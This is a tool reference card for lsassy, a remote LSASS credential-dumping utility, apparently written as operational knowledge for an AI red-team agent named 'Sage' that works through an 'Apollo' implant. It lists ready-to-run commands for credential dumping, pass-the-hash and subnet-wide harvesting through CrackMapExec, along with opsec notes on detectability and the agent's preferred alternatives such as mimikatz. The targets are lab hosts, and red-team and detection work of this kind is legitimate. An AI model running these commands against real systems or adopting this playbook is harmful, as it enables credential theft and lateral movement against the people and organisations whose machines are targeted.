---
name: lsassy
category: credential-access
subcategories: [lsass-dump, remote-credential-harvest]
tradecraft_tags: [lsass, credentials, remote, smb, python, network-based-dump]
mitre_attack:
  - id: T1003.001
    name: OS Credential Dumping — LSASS Memory
source:
  url: https://github.com/Hackndo/lsassy
  license: MIT
  maintained: true
binary_type: python-script
binary_filename: lsassy
supported_os: [linux]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  lsassy performs a remote LSASS dump via SMB (using various dump methods including
  comsvcs.dll via WMI, procdump, dumpert-dll, etc.). All remote LSASS dump triggers
  generate Event 10 in Sysmon on the target. SMB-based operations generate network
  authentication events. EDR sees LSASS access from a remote process (not necessarily
  blocked but logged). Network LSASS dump is more detectable than local dump.
usage_examples:
  - description: Dump credentials from a remote host
    args: "lsassy -d north.sevenkingdoms.local -u jon.snow -p Password123 192.168.56.22"
  - description: Dump using hash-based auth (pass-the-hash)
    args: "lsassy -d north.sevenkingdoms.local -u administrator -H :nthash 192.168.56.22"
  - description: Specify dump method (comsvcs, procdump, dumpert)
    args: "lsassy -d north.sevenkingdoms.local -u jon.snow -p Password123 -m comsvcs 192.168.56.22"
  - description: Dump multiple targets from CrackMapExec integration
    args: "crackmapexec smb 192.168.56.0/24 -u jon.snow -p Password123 -M lsassy"
opsec_notes: |
  Network-based LSASS dump is generally louder than local methods — the WMI/SMB path to
  create the dump on the remote system generates additional network authentication events.
  Python-only — not usable from Apollo directly. For Apollo-based LSASS dumping, prefer
  Apollo's native `mimikatz` command or nanodump (once BOF support exists). lsassy's
  advantage is dumping targets remotely without needing a foothold on each machine.
gotchas: |
  Python tool — not runnable from Apollo. The remote dump method must be supported on the
  target (comsvcs.dll is built-in but detectable; procdump requires upload; dumpert-dll
  requires a BOF-equivalent load). Credential output is in memory — lsassy handles the
  parsing but the tool and parsing are both Python-side. Requires admin access on the
  target (for LSASS handle).
related_ttps: [nanodump, mimikatz, sharpkatz]
alternatives: [nanodump, mimikatz-sekurlsa-minidump, crackmapexec-ntds]
common_args:
  -d:
    name: --domain
    description: Target domain
    typical_values: ["north.sevenkingdoms.local"]
  -u:
    name: --username
    description: Authentication username
    typical_values: ["jon.snow", "administrator"]
    required: true
  -p:
    name: --password
    description: Authentication password
    typical_values: ["Password123"]
  -H:
    name: --hashes
    description: NTLM hash for pass-the-hash (LM:NT)
    typical_values: [":nthash"]
  -m:
    name: --method
    description: Dump method to use
    typical_values: [comsvcs, procdump, dumpert, mirrordump, ppldumper]
  target:
    description: Target IP or hostname
    typical_values: ["192.168.56.22"]
    required: true
last_updated: 2026-05-29
---

# lsassy

A Python-based remote LSASS credential dumping tool. lsassy connects to a target
via SMB/WMI to trigger an LSASS dump (using various methods), download the dump,
parse it with pypykatz, and return credentials — all from the attacker's Linux machine
without installing anything on the target beyond what's needed for the dump method.
Integrates as a CrackMapExec module for network-wide credential harvesting.

## Typical use cases
- Remote LSASS credential harvest from multiple machines via SMB
- Automated credential harvesting in conjunction with CrackMapExec lateral movement
- When a local foothold isn't yet established but admin creds to a target are available

## How Sage uses this
lsassy is an infrastructure-side Python tool. For Apollo engagements, Apollo's native
`mimikatz` command is preferred for local LSASS access. lsassy would be used from
attacker infrastructure when credentials are available but no established agent exists
on the target yet.

## Apollo-specific note
Python-only — not runnable from Apollo. For LSASS access from within Apollo, use
Apollo's native `mimikatz` command (preferred) or nanodump via BOF (when Apollo adds
BOF support). lsassy is documented for completeness in network-based credential harvesting.
